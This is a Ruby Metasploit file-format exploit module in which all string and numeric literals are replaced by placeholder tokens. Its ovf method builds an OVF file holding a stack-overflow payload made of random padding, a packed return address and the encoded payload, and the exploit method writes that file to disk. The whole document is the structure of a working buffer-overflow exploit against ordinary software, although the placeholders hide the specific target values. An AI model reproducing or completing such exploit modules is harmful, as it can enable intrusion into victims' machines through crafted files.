require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > true , <str> = > ( <hex> .. <hex> ) . to_a . pack ( <str> ) + <str> + ( <hex> .. <hex> ) . to_a . pack ( <str> ) + ( <hex> .. <hex> ) . to_a . pack ( <str> ) + <str> , <str> = > - <int> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <int> } } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <int> , <str> = > <int> , <str> = > <int> } ] , ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def ovf my_payload = rand_text_alpha ( <int> ) my_payload << [ target . ret ] . pack ( <str> ) my_payload << payload . encoded fs = rand_text_alpha ( target [ <str> ] ) fs << rand_text_alpha ( target [ <str> ] ) fs << my_payload fs << rand_text_alpha ( <int> - <int> - target [ <str> ] - target [ <str> ] - my_payload . length - ( target [ <str> ] * <int> ) ) fs << <str> * target [ <str> ] fs << <str> ovf_file = <<- <str> EOF <str> <str> EOF ovf_file end def exploit print_status ( <str> datastore [ <str> ] <str> ) file_create ( ovf ) end end 
